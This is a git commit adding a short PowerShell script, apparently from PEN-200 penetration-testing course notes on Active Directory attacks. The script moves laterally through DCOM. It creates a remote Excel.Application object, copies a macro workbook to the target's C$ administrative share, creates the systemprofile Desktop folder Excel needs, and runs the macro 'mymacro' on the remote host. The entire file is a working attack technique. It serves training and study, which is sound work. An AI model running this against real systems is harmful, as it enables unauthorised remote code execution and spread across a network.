cedb9258e175a700d9f46fea9e737b42165a0b5b
Ansh Goyal <goyalansh063@gmail.com>
2021-04-10 17:50:01 +0530

    PEN200

---
+++ PEN 200/ACTIVE DIRECTORY ATTACKS/Execution of Excel Macro Remotely.ps1
@@ -0,0 +1,15 @@
+﻿$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192 .168.1.110"))
+
+$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
+
+$RemotePath = "\\192.168.1.110\c$\myexcel.xls" 
+
+[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
+
+$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop" 
+
+$temp = [system.io.directory]::createDirectory($Path)
+
+$Workbook = $com.Workbooks.Open("C:\myexcel.xls") 
+
+$com.Run("mymacro")
